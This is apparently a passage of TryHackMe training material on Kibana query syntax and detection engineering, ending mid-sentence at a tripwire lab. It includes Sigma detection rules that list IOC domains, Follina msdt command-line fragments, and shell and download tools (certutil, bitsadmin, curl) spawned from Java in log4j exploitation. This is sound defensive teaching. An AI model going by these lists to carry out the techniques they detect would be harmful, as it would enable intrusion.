Fuzzy searching also works even if the number of characters of the word is not the same. For example, a search query of `host_name:workstation01~1` would result in the following:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/e5a332673547ae5aab02b682baa33b2e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/e5a332673547ae5aab02b682baa33b2e.png)

**Proximity Searches**

Proximity searches 
allow you to search for documents where the field values contain two or 
more terms within a specified distance. In KQL, you can use the 
match_phrase query with the slop parameter to perform a proximity 
search. The slop parameter sets the maximum distance that the terms can 
be from each other. For example, a slop value of 2 means that the words 
can be up to 2 positions away.

The format when doing a proximity search is like so:

`field_name:"search term"~slop_value`

As
 you can see, the "~" character is used, followed by a slop_value. Note 
that "~" is used for both proximity searches and fuzzy searching; the 
difference is that in proximity searches, the slop value is applied to a
 phrase enclosed in quotation marks (").

Let's continue. Consider the following example dataset:

| log_id | log_message |
| --- | --- |
| 1 | Server error: failed login attempt. |
| 2 | Login server - failed on startup with error. |
| 3 | Login to server failed successfully. |
| 4 | Server: Detected error in connection. |

To search for all documents where the terms "server" and "error" 
appear within a distance of 1 word or less from each other in the 
"log_message" field, you can use the following query:

```
log_message:"server error"~1
```

This query will return the following documents:

```json
{ "log_id": 1, "log_message": "Server error: failed login attempt." }, { "log_id": 4, "log_message": "Server: Detected error in connection." }

```

You can see in the results above that "server" and "error" have one word or less in between them.

If we change our query to:

`log_message:"failed login"~0`

Then we'll end up with just:

```json
{
  "log_id": 1,
  "log_message": "Server error: failed login attempt."
}
```

# Trying it out in

We're still going to be using Lucene for this task. Change the index pattern to `proximity-searches` and use the following query:

`log_message:"server error"~4`

This should give us the results below. Notice, in the 3rd result, there are four words between "server" and "error".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/96c5766e0003fb7a48d7fdbea5e938d9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/96c5766e0003fb7a48d7fdbea5e938d9.png)

You
 can also use operators such as AND and OR in more complex queries for 
multiple proximity searches. For example, if you want to search for 
documents containing either "failed login" or "server error" within a 
distance of 2 words, you could use the following query:

`log_message:"server error"~1 OR "login server"~1`

Which will return the following documents:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/6980ad990a557b153e59b1cdd012f6f4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/6980ad990a557b153e59b1cdd012f6f4.png)

**Regular Expressions**

Regular
 expressions (or regex, regexp) allow you to use a pattern to match 
field values. You'll encounter this powerful concept frequently when 
working with data. We can use regexp in Kibana to search for complex patterns that cannot easily be found using simple query strings or wildcards.

Before you continue, I encourage you to check out the [Regexp room](https://tryhackme.com/room/catregex).
 That room will cover the basics of regular expressions and give you 
most of what you need to grasp better what is covered in this task.

# Trying it out in

You'll notice that we're heading straight to Kibana
 this time. This is because regular expressions can get confusing if you
 don't know what you are doing. Thankfully, Kibana highlights matches in
 the documents we'll use to verify our expressions.

Like before, please change the index pattern to `regular-expressions`.

Consider the following dataset:

| ID | Date | Event Type | Description | Source IP | Destination IP | URL |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | 2023-04-10 | DDoS Attack | Distributed denial of service attack on a company's website | 192.168.1.10 | 203.0.113.1 | http://www.example1.com |
| 2 | 2023-04-12 | Phishing | Phishing email attempting to steal user credentials | 192.168.1.11 | 203.0.113.2 | http://www.example2.com/login |
| 3 | 2023-04-15 | Malware Infection | Malware infection on a user's computer | 192.168.1.12 | 203.0.113.3 | http://www.example3.com/download |
| 4 | 2023-04-16 | XSS Attack | Cross-site scripting attack on a web application | 192.168.1.13 | 203.0.113.4 | http://www.example4.com/comment |
| 5 | 2023-04-20 | SQL Injection | SQL injection attack on a company's database | 192.168.1.14 | 203.0.113.5 | http://www.example5.com/query |

To use regex in a query, you must wrap your regular expression in 
forward slashes (/). Let's start with a relatively simple example and 
use ".*" to match all characters of any length.

`Event_Type:/.*/`

This will return all the entries, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/f3097d689176e23a21de272e48d27c80.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/f3097d689176e23a21de272e48d27c80.png)

Notice that all entries of "Event_Type" that matched are highlighted in Yellow.

If we want only to return entries that start with the letters "S" or "M", then we could use the following :

`Event_Type:/(S|M).*/`

This will return only the entries that start with S and M, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/caad6ff989c8931a6a9aa5e9c4b3f367.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/caad6ff989c8931a6a9aa5e9c4b3f367.png)

One important thing to note about Kibana's regex engine is that its behaviour changes depending on the data type.

So
 far, we've used regex on the "Event_Type" field. And the data type for 
this field is set internally to "keyword". Regular expressions behave as
 you'd expect when searching for data with this type.

The behaviour changes if the data type is set to "text". For example, the field "Description" has "text" as its data type.

Try the following query:

`Description:/.*/`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/a5e02a51d84002a2b861077c0259c6ca.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/a5e02a51d84002a2b861077c0259c6ca.png)

So far, so good. All the entries are returned because we match all characters of any length.

Now this is where things change. Try the following query and check the results:

`Description:/(s|m).*/`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/5f91e75a6a61ecfc41315965ca88c282.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/5f91e75a6a61ecfc41315965ca88c282.png)

Notice
 that instead of the whole description being highlighted in yellow, only
 single words starting with the letters "s" or "m" are highlighted. This
 is because when a text field is analyzed, the string is tokenized, and 
the regular expression is matched against each word. This is why the 
words "SQL", "steal", "service", and even "site" from "Cross-site 
scripting" is highlighted.

This approach allows for flexibility which can be further utilized by combining it with more expressions, as shown below:

`Description:/(s|m).*/ AND /user.*/`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/f6d344218e89e1bec2f5010485eafa8f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/f6d344218e89e1bec2f5010485eafa8f.png)

## **DETECTION ENGINEERING**

**What is Detection Engineering?**

### Detection Engineering

Cybersecurity is growing and evolving at a
 rapid rate, compounded by
the progress made in technology. With this, adversary actions are also
evolving, and cyber attacks are becoming so rampant and sophisticated
that it is difficult to keep up with them. Additionally, security teams 
must
develop and adapt to new mindsets and practices that will aid them in 
keeping up with adversaries. That’s where detection engineering comes 
in.

Detection engineering is the continuous 
process of building and operating threat intelligence analytics to 
identify potentially malicious activity or misconfigurations that may
affect your environment. It requires a cultural shift with the alignment
of all security teams and management to build effective threat-rich
defence systems.

# Detection Types

Threat detection can be viewed from two perspectives, each comprising
two categories: The first
one, **Environment-based** detection, focuses on looking at
changes in an environment based on configurations and baseline
activities that have been defined. Within this detection, we have
Configuration detection and Modelling.

In the second perspective,
 **Threat-based** detection focuses on elements associated
with an adversary’s activity, such as tactics, tools and artefacts
that would identify their actions. Under this, we have Indicators and
Threat Behaviour detections.

### Configuration Detection

Under this detection, we use current knowledge of the known environment and infrastructure to identify misalignments.
Configurations can cross domains, including network, asset or
identity.

Configuration detection has the following benefits and
challenges:

| **Benefits** | **Challenges** |
| --- | --- |
| The easiest form of detection to create and maintain in static
environments. | Difficult to maintain in dynamic environments. |
| Under perfect conditions and coverage, it detects all malicious
activity. | Limited visibility reduces effectiveness. |
| Individuals with different expertise can execute the detection. | There’s an assumption of knowledge of the working infrastructure and
configurations for effectiveness. |
| Easy to combine with other detections for forensics and
response. | Frequent configuration changes can result in high false
positives. |

### Modelling

Threat detection under this type is done by
defining baseline operations and activities and recording any deviations
that occur. The primary assumption of this approach is that malicious
activity can be sufficiently identified from benign activity.

The approach involves building an asset or activity profile that
includes baseline events, time and data threshold. An in-depth look into
baselining shall be discussed in the next task.

Some of the benefits and challenges of this detection method
include the following:

| **Benefits** | **Challenges** |
| --- | --- |
| Used to identify unknown adversary activities due to model changes and not threat characteristics. | Provides no context of threat activity during investigations. |
| Easy to maintain in very static environments. | Difficult to maintain in dynamic environments. |
|  | Limited visibility reduces effectiveness. |
|  | Assumes in-depth knowledge of the working infrastructure and configurations. |
|  | Potentially adds existing malicious activity into the model. |

### Indicator Detection

As a reminder, indicators are pieces of information that identify a
state and context of an element or entity. There are both
`good` indicators used to identify legitimate activities or
resources, such as those used in whitelists, and `bad`
indicators used for suspicious or malicious resources, such as in
blacklists or malware IPs.

IOCs are commonly referenced and derived from
investigations against malicious events. By observing threat activities and investigations, analysts can use identified
indicators to craft detections and adapt them based on an adversary’s
rate of change.

Some of the benefits and challenges of this detection method
include the following:

| **Benefits** | **Challenges** |
| --- | --- |
| Fastest detection to create and deploy. | The value of detection depends on the adversary’s rate of change. |
| Indicators raise specific threat contexts. | Retroactive in nature, one needs to observe the indicator first. |
| Useful for enriching data sources and detections. | Limited to some indicators that can be processed at a time. |
| Practical for scoping environments post investigation of indicators. | Unknown indicator expiry or change timelines can lead to false detections. |

### Threat Behaviour Detection

Analysts will look at an adversary’s Tactics, Techniques and Procedures (TTPs) to conduct an
attack, regardless of any specific indicators. This makes detection more
scalable beyond indicators.

Through this detection, analysts can focus
 their efforts more
efficiently on responding to the threat and mitigate against it instead 
of utilising time and resources to understand how and why alerts were 
triggered. Additionally, threat behaviour detection can be paired with 
established workflows and playbooks to provide best practices that can 
be followed during an investigation.

Some of the benefits and challenges of this detection method include the following:

| **Benefits** | **Challenges** |
| --- | --- |
| Withstands the adversary’s rate of change. | Due to the adversary’s complexities, lots of data is required to provide complete coverage. |
| Easy to tune and adapt to different environments. | Moderately difficult to make initial implementations due to baseline assessments. |
| Low rates of false positives. | Only detects similar threat behaviour based on the set analytic. |
| Integrates with defensive playbooks and automated remediation plans. | Modifications must be made if detections must be reused across industries. |

Combining these forms of detection results in more robust defence
systems. For example, model-based detection can be strengthened with
expert-led configuration detection to reduce the chances of having false
positives throwing alerts.

# Detection as Code

Detection as Code (DaC) is a structured approach to writing
detections by incorporating software engineering best practice
principles. This means that detection engineers and analysts will handle
detection processes and logic as code, offering scalability to address
the rapidly changing environments and adversary capabilities.

DaC offers a code-driven workflow that creates fine-tuned detection
processes that introduce critical elements found in Continuous Integration/Continuous Development (CI/CD) workflows. Some of
these elements include:

- **Version Control:** Most SIEMs and EDR products lack
the ability to track changes made to alerts and their definitions. By
introducing version control, detection rules and processes can be quickly
reviewed, tested and accounted for, enabling higher-quality
detections.
- **Automation workflows:** By adopting a CI/CD workflow,
detection testing can be automated and allow quick transition and production delivery.

With that, Detection as Code provides the following benefits:

- **Customisable and Flexible Detections:** Using a
common language for detections, such as Sigma and YARA, offers an
opportunity for DaC to be vendor-agnostic and be deployed across
numerous SIEM, EDR, and XDR solutions.
- **Test-Driven Development:** Quality testing of
detection code can ensure that blind spots and false positive tests are
identified earlier in the process and promote detection efficacy.
Additionally, this approach improves the quality of detections and
ensures they are well documented.
- **Team collaborations:** Using the CI/CD workflows eliminates isolation between security teams and fosters collaboration through the coding process.
- **Code Reusability:** With detection patterns emerging
over time, engineers can reuse code to perform similar functions across
different detections, ensuring that the detection process moves on
faster since there won’t be the need to start from the beginning.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/d5dcb2327fef9f42f4958212efb5dd2c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/d5dcb2327fef9f42f4958212efb5dd2c.png)

**Detection Engineering Methodologies**

# Detection Gap Analysis

The first step involves looking at the environment and identifying
key areas where organisations can improve threat detection. This process is also
known as **threat modelling** and can be done in the
following ways:

- **Reactive**: Assessing the most recent internal
incident reports, taking note of the lessons learnt from the attacks and curving out missed areas of possible detection.
- **Proactive**: Using the ATT&CK framework and
various threat intelligence sources to map out potential areas of attack
and the various TTPs that an adversary against your environment may use.

Note: Threat modelling in this context differs from the detection type discussed in the previous task.

# Datasource
Identification and Log Collection

With information about the relevant threat actors, TTPs and potential
risks the organisation may face, sources of relevant data
associated with the risks need to be identified. This will determine
what logs are currently available that will aid in defining detections
against the threats and know which ones are missing and which are necessary.

### Baseline Creation

Before using all the collected information about adversaries, their
TTPs and any malicious behaviour, security analysts need to know what
normal behaviour is and set their security baselines. This will be a
rolling process and requires participation from all departments within
an organisation.

Setting up security baselines involves identifying the different
types of devices running within an organisation based on their
operating system, services and functions. Security baselines can be
grouped into two categories:

- **High-level:** This sets broad OS independent
standards guided by a specified security policy.
- **Technical:** This consists of OS-based configuration
standards outlining different system functions and the intended
behaviours or activities. For example, technical baselines outline OS
hardening policies, network activities, Identity and Access Management (IAM) policies, and application
policies.

### Log Collection

Once the baselines and sources of internal data have been identified
and prioritised, the collection of logs and metadata useful for threat
detection should be done. Depending on the infrastructure setup, a
centralised system may aggregate all logs using
network sensors for network data and services such as Sysmon to collect
host data.

# Rule Writing

Based on the infrastructure setup and SIEM services, detection
rules will need to be written and tested against the data sources.
Detection rules test for abnormal patterns against logged events.
Network traffic would be assessed via Snort rules, while Yara rules would evaluate file data. Check out the [Snort](https://tryhackme.com/room/snort) and [Yara](https://tryhackme.com/room/yara) rooms for
more.

As part of the Detection Engineering module, we shall look at [Sigma](https://tryhackme.com/room/sigma), a generic signature language used to write detection rules
against log files.

# Deployment, Automation &
Tuning

Tested detection rules must be put into production 
to be assessed in a live environment. Over time, the detections would 
need to be modified and updated to account for changes in attack 
vectors, patterns or environment. This improves the quality of 
detections and encourages viewing detection as an ongoing process.

**Detection Engineering Frameworks 1**

# MITRE’s ATT&CK and CAR Frameworks

MITRE is well-known for publishing identified CVEs that adversaries
would look to exploit for their malicious activities. Additionally, MITRE provides knowledge-based access that security analysts
can use to track tactics and techniques commonly used by malicious
actors across different platforms such as Windows, macOS, Linux, and
Mobile.

The [ATT&CK framework](https://attack.mitre.org/) helps
 map out adversarial actions based on the infrastructure in use for 
detection engineering. It guides what to look for, especially as part of
 the
detection gap analysis phase.

The CAR ([Cyber Analytics
Repository](https://car.mitre.org/)) knowledge base is used to detect adversary behaviours
and prioritise them based on the ATT&CK framework.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/3002249bee56ca5ab666e92e461cdb48.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/3002249bee56ca5ab666e92e461cdb48.png)

Click to enlarge the image.

# Pyramid of Pain

This is a well-known framework in the 
industry and is mainly used to showcase the pain for the adversary; if 
the defenders detect their TTPs, then how difficult and/or costly it 
would be for the adversary to change their TTPs.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/bcf0b565e7be2702dc3a2e2c46c6054b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/bcf0b565e7be2702dc3a2e2c46c6054b.png)

# Cyber Kill Chain

Thanks to a military concept of an attack strategy, Lockheed Martin
formulated the Cyber Kill Chain framework to define the necessary steps
followed by adversaries. The framework focuses on seven crucial phases
that cyber-attacks commonly follow:

- Reconnaissance
- Weaponisation
- Delivery
- Exploitation
- Installation
- Command & Control
- Actions on Objectives

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/491cbe4c1851ca69aea2a387e5525321.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/491cbe4c1851ca69aea2a387e5525321.png)

As a security analyst and detection engineer, understanding the Cyber
Kill Chain will give you the knowledge to recognise intrusion
attempts crafted by an adversary and map them into your detection
plan. The Unified Kill Chain was developed to complement the Cyber Kill
Chain by combining it with other frameworks, such as the MITRE ATT&CK
framework. This expanded the original kill chain into 18 phases to
cover every known element of a cyber attack.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/f78d42cc461eaebffd806666646f6cbb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/f78d42cc461eaebffd806666646f6cbb.png)

If you are unfamiliar with these frameworks, check out these rooms
that will provide an in-depth understanding:

- [Pyramid of
Pain](https://tryhackme.com/room/pyramidofpainax)
- [Cyber Kill
Chain](https://tryhackme.com/room/cyberkillchainzmt)
- [Unified Kill
Chain](https://tryhackme.com/room/unifiedkillchain)
- [MITRE](https://tryhackme.com/room/mitre)

**Detection Engineering Frameworks 2**

### Alerting
and Detection Strategy Framework

Palantir developed the ADS Framework to provide a guideline
for documenting detection content. A significant challenge faced
by security teams, and Palantir being no exception, is alert fatigue and
apathy, mainly caused by poor means of developing and implementing
detection alerts that would result in effective incident response and
mitigation. The ADS Framework seeks to address this challenge and
provide a guideline for constructing effective detections and
alerts.

The ADS Framework has a strict flow that detection engineers must follow before
publishing detection rules into production. The stages involved are:

1. **Goal:** Describes the intended reasons for setting
up the alert and the type of behaviour that needs to be
detected.
2. **Categorisation:** Mapping the detection to the
MITRE ATT&CK framework to provide analysts with information on the
TTPs for investigation and areas of the kill chain where the ADS will be used.
3. **Strategy Abstract:** Provides a top-level
description of how the detection strategy being implemented functions by
outlining what the alert will look for, the data sources,
enrichment resources and ways of reducing false positives.
4. **Technical Context:**
Describes the technical
environment of the detection to be used, providing analysts and
responders with all the information needed to understand the alert.
Security analysts should align this information with the platforms and
tools for
collecting and processing threat alerts.
5. **Blind Spots and Assumptions:** Describes any
issues identified where suspicious activities may not trigger the strategy. Assumptions
and blind spots help clarify ways the ADS may fail or be bypassed by an
adversary.
6. **False Positives:** Outlines occurrences where
alerts may be triggered due to misconfigurations or non-malicious
activities within the environment. This makes it easy to
configure your SIEM to limit alert generation to only targetted threats
when pushed to production.
7. **Validation:** Every
detection needs to be verified, and here, you can outline all the steps
required to produce a true-positive event that would trigger the
detection alert. Consider this
a unit test, which can even be a script or scenario used to
generate an alert. For an effective validation:
    - Develop a plan that will produce a true-positive outcome.
    - Document the process of the plan.
    - From the testing environment, test and trigger an alert.
    - Validate the strategy that triggered the alert.
8. **Priority:** Set up the alerting levels with which the
detection strategy may be tagged. This section provides the details
of the criteria used to set up the preferences, and it is separate from
the alerting levels shown through the SIEM.
9. **Response:** Provides details of how to triage and
investigate a detection alert. This information is helpful for analysts
and responders to be able to prevent extreme repercussions.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/28b4c33f004df15d26ae8d5b2862b445.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/28b4c33f004df15d26ae8d5b2862b445.png)

# Detection Maturity Level Model

[Ryan Stillions](http://ryanstillions.blogspot.com/2014/04/the-dml-model_21.html)
 brought forward the Detection Maturity Level (DML) model in 2014 as a 
way for an organisation to assess its maturity levels concerning its 
ability to ingest and utilise
cyber threat intelligence in detecting adversary actions. According to
Ryan, there are two guiding principles for this model:

1. An organisation's maturity is not measured by its capabilities
of obtaining valuable intelligence but by its ability to apply it to detection and response.
2. Without established detection functions, there is no opportunity to
carry out response functions.

The DML model comprises nine dedicated maturity levels, numbered
from 0 to 8, with the lowest value representing technical aspects of an
attack and the highest level representing abstract and
intelligence-based aspects of an attack. The individual levels can be
described as follows:

- **DML-8 Goals:** The pinnacle of the model represents
organisations that can detect an adversary's motive and goals.
Unfortunately, it is near impossible to conduct detections solely based
on goals, as in most cases, it is a guessing game based on behavioural
findings from lower DMLs.
- **DML-7 Strategy**: Following closely after DML-8, this
level is non-technical and represents the adversary's intentions and
strategies to fulfil them. Organisations at this level would have a
mature intelligence source that will ensure they have context about
an adversary's plans, which will be helpful to responders.
- **DML-6 Tactics:** Organisations must be able to detect
a tactic being used by an adversary without necessarily knowing which
technique or tool they used. Tactics are detectable after observing
patterns of events that aggregate over time and conditions.
- **DML-5 Techniques:** Techniques usually are specific
to an individual or APT. Therefore, adversaries leave behind evidence of
their attack habits and behaviours and organisations that can
detect when a particular threat actor is within their environment are at
an advantage.
- **DML-4 Procedures:** Organisations require to detect
sequences of events from an adversary at this level. They will be very
organised and follow a given pattern, such as the pre-exfiltration
reconnaissance.
- **DML-3 Tools:** Detection of tools can fall into two
phases: the `transfer phase` where the tool is downloaded via the network onto a host device and resides on a file system or in
memory. And the second is detecting through the tool's `functionality and operation`. In some cases, this detection
level would require organisations to perform reverse engineering against
adversarial tools, making it difficult to cause havoc
by understanding their tools' capabilities.
- **DML-2 Host & Network Artefacts:** Most
organisational resources would be spent gathering IOCs and artefacts as
threat intel at this level. Unfortunately, in most cases, indicators are
observed after the fact. The threat actor would likely be causing havoc
within the network when artefacts are picked up and investigated.
This has been described as "chasing the vapour trail of an
aircraft".
- **DML-1 Atomic Indicators:** This level comprises organisations utilising threat intel feeds in the form of lists of
IP addresses and domains to detect threats.
- **DML-0 None:** At the bottom of the model,
organisations that operate at this level have no detection processes
established.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/11fa9eee5dd93d44e427dbafee54b30c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/11fa9eee5dd93d44e427dbafee54b30c.png)

In the original publication of the DML model, Ryan described four critical
use cases for the model, namely:

1. To provide a lexicon for more accessible communication of threat
information.
2. To assess detection maturity against monitored threat actors.
3. To assess the maturity of security vendors and products in use.
4. To provide context to analysts by including the DML levels in Yara
rules, Snort signatures and SIEM correlation rules.

**Unique Threat Intel**

*You stumbled upon documentation of a previous incident containing a couple of unique Indicators of Compromise (IOCs)*

Unique
 IOCs of previous intrusions are good examples of Threat Intel as 
they’re traces of the specific adversary that your environment has 
already faced. The inclusion of these IOCs in your detection mechanism 
will help spot re-intrusion of that specific adversary immediately, 
among others.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/51077cd7c3bbd1554bad77c6fa36c2e3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/51077cd7c3bbd1554bad77c6fa36c2e3.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/3eff28c169e68301b6c8577a722a5544.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/3eff28c169e68301b6c8577a722a5544.png)

The
 screenshots above are excerpts from a spreadsheet that contains IOCs 
that can be integrated with the organization’s current detection 
mechanism. It’s more or less the same format that Incident Responders 
use as they go through their investigation. Logging in IOCs in a file 
like this allows for better collaboration among multiple incident 
responders. It also makes scoping of the incident more effective - more 
often than not, IOCs lead to more IOCs.

In
 the spreadsheet excerpt above, based on the description, the direct 
indicator found by the authors of the documentation is actually just the
 **bad3xe69connection[.]io**; however, upon further inspection of the
 malicious domain, they were able to conclude that two other malicious 
domains should be recorded as IOCs due to their association with the 
original malicious domain.

To maximize our efficiency, we will transform these IOCs into detection rules in a vendor-agnostic format using **Sigma**.

Sigma
 is an open-source generic signature language developed to describe log 
events in a structured format. This allows for quick sharing of 
detection methods by security analysts.

A basic example of how it can be written into a functional Sigma rule is as follows.

baddomains.yml

```
title: Executable Download from Suspicious Domains
status: test
description: Detects download of executable types from hosts found in the IOC spreadsheet
author: Mokmokmok
date: 2022/08/23
modified: 2022/08/23
logsource:
  category: proxy
detection:
  selection:
    c-uri-extension:
      - 'exe'
    r-dns:
      - 'bad3xe69connection.io'
      - 'kind4bad.com'
      - 'nic3connection.io'
  condition: selection
fields:
  - c-uri
falsepositives:
  - Unkown
level: medium

```

The Sigma rule that we came up with from the IOCs 
presented above is very simple and straightforward, yet the additional 
layer of detection that it gives the organization is invaluable. In the 
grander scheme of things, these layers work together to give your 
analysts the visibility that they need to spot bad actors before it's 
too late.

Remember that the bad guys need to circumvent all our 
defenses in order to get to their objectives, but we only need them to 
fail one layer of detection to have an idea that they're there.

**Publicly Generated IOCs**

*You’re
 feeling proud of yourself for being able to implement detection rules 
that have an immediate impact on the organization when suddenly, news 
broke out of a new 0-day vulnerability. Upon taking a closer look at it,
 you realize that your organization is directly susceptible to this 
vulnerability.*

You
 don’t have to be able to experience everything in order to learn from 
something - you can learn from other people’s experiences or research or
 learnings. Analogous to that is the array of research being done by the
 community, and almost always, they release public IOCs. These public 
IOCs are then transformed into usable mechanisms to detect bad things in
 the environment.

Going
 back to our previous task, we've leveraged Sigma to transform unique 
IOCs into a product-agnostic form that we can use regardless of our SIEM
 choice. As this technique shows great promise to the community, there 
are a number of nice repositories that contain user-submitted Sigma 
rules that anyone can use. You can plug one directly into your SIEM for immediate value, or further edit it to fit your environment and add even more value to your security posture.

The following is a nice exercise: Write
 a detection rule for these two / transform these publicly generated 
IOCs into usable alerts for use in the Elastic Stack and Splunk. We will do the first one together, while you can do the rest on your own. For our purposes, we will be using [Uncoder](https://uncoder.io/) to help with the transformation of these sigma rules. Uncoder is a nice tool that helps convert sigma rules to queries that can be immediately used within a SIEM of your choice.

A fairly recent 0-day vulnerability, Follina-MSDT, has a publicly available sigma rule developed by huntress's Matthew Brennan:

Follina-MSDT Sigma Rule

```
title: Suspicious msdt.exe execution - Office Exploit
id: 97a80ed7-1f3f-4d05-9ef4-65760e634f6b
status: experimental
description: This rule will monitor suspicious arguments passed to the msdt.exe process. These arguments are an indicator of recent Office/Msdt exploitation.
references:
    - https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e
    - https://twitter.com/MalwareJake/status/1531019243411623939
author: 'Matthew Brennan'
tags:
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:

    selection1:
      Image|endswith:
        - 'msdt.exe'
    selection2:
      CommandLine|contains:
        - 'PCWDiagnostic'
    selection3:
      CommandLine|contains:
        - 'ms-msdt:-id'
        - 'ms-msdt:/id'

    selection4:
      CommandLine|contains:
        - 'invoke'
    condition: selection1 and (selection4 or (selection2 and selection3))
falsepositives:
  - Unknown
level: high

```

Another 0-day vulnerability that made waves this past year, log4j, has multiple publicly available sigma rules. One such rule can detect [suspicious shells](https://github.com/SigmaHQ/sigma/blob/d46d89e403c7ebe9f70a100859c7c8cac1841a33/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_by_java.yml) spawned from a Java host process, written by Andreas Hunkeler and Florian Roth:

Log4j Suspicious Shells Sigma Rule

```
title: Suspicious Shells Spawned by Java
id: 0d34ed8b-1c12-4ff2-828c-16fc860b766d
description: Detects suspicious shell spawned from Java host process (e.g. log4j exploitation)
status: experimental
author: Andreas Hunkeler (@Karneades), Florian Roth
date: 2021/12/17
modified: 2022/08/02
tags:
    - attack.initial_access
    - attack.persistence
    - attack.privilege_escalation
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\java.exe'
        Image|endswith:
            - '\sh.exe'
            - '\bash.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\schtasks.exe'
            - '\certutil.exe'
            - '\whoami.exe'
            - '\bitsadmin.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\scrcons.exe'
            - '\regsvr32.exe'
            - '\hh.exe'
            - '\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/            - '\mshta.exe'
            - '\rundll32.exe'
            - '\forfiles.exe'
            - '\scriptrunner.exe'
            - '\mftrace.exe'
            - '\AppVLP.exe'
            - '\curl.exe'
    condition: selection
falsepositives:
    - Legitimate calls to system binaries
    - Company specific internal usage
level: high

```

Upon navigating to [Uncoder](https://uncoder.io/), you will immediately see two text boxes, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/79fa09b3a6a8d9e94447fc02e8a63f4b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/79fa09b3a6a8d9e94447fc02e8a63f4b.png)

Make
 sure that on the left side, the Sigma tab is selected as shown above. 
Copy the Follina-MSDT Sigma Rule contents and then paste it in the left 
text box. Click on the downward arrow and select ElastAlert. Click on 
the *Translate* button when you're ready.

Upon clicking Translate, it shouldn't take long before the results come out of the right text box.

It
 is important to note that there's no guarantee that the transformed 
Sigma rules will work perfectly straight out of Uncoder. In order to be 
production ready, you need to do a lot of testing and fine-tuning. What 
Uncoder essentially offers is a generic blueprint - it is up to the user
 to further improve upon it.

**Leveraging “Know Your Environment”: Tripwires**

One
 way to create immediate impact is to leverage very specific data to 
your advantage. Depending on the environment/organization, more often 
than not, there exist pieces of data that not everyone is entitled to 
have access to. Usually, controls are set by the IT team to limit these accesses.

For
 example, suppose there are ultra-sensitive files your organization 
intends to keep secret, such as a hidden treasure map. In that case, you
 can set alerts for instances that the said map has been accessed, 
edited, and deleted among other things, and then filter out the ones 
allowed access to make detections more actionable.

Tripwires
 are a great way to supplement the detection mechanisms that you already
 have in place. It’s a way to cover “unknown unknowns” and even study an
 adversary. The most common tripwires are Honeypots and Hidden Files and
 Folders.

The
 way honeypots work is that they serve no legitimate business purpose, 
so any activity concerning them should raise immediate red flags. Hidden
 files and folders, on the other hand, are not meant to even be seen by 
normal end users, and so it works best when dealing with crawlers like 
worms making them particularly effective to detect intrusions.

# Setting up a Basic Tripwire:

Click on the **Start Machine** button at the top right corner of this task. The machine will be available on your web browser, in split-screen view. In case the VM
